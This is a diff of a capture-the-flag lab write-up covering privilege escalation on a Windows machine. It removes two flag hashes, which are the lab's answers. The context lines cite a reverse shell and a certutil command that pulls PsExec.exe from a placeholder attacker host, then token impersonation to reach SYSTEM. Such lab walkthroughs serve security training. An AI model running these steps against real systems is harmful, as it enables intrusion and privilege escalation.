@@ -29,7 +29,6 @@ So, after some reasearch, I understood that the script must be written in groovy
 ![image](https://github.com/user-attachments/assets/3a615248-071f-41f6-af7e-c5e7cf7928a6)<br />
 So I was able to get the flag: <br />
 ![image](https://github.com/user-attachments/assets/5afb69d9-8d50-444e-87e0-a0914bd790de)<br />
-`79007a09481963edf2e1321abd9ae2a0`
 
 
 ### Switching Shells
@@ -44,5 +43,5 @@ Run `whoami /priv` to find out which privileges are enabled for my user: <br />
 We have the `SeImpersonatePrivilege`. After some reaserch I found out that this can be exploited using the `PsExec.exe` from the sysinternal utilities. So first i downloaded the .exe on my machine, and then transfered it on the windows reverse shell using the command `certutil -urlcache -split -f http://YOUR_IP:8000/PsExec.exe C:\Windows\Temp\PsExec.exe`. Now we can run `PsExec.exe` to locate the root flag.<br />
 
 - Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command? `NT AUTHORITY\SYSTEM`
-- Read the root.txt file located at C:\Windows\System32\config `dff0f748678f280250f25a45b8046b4a `
+
  
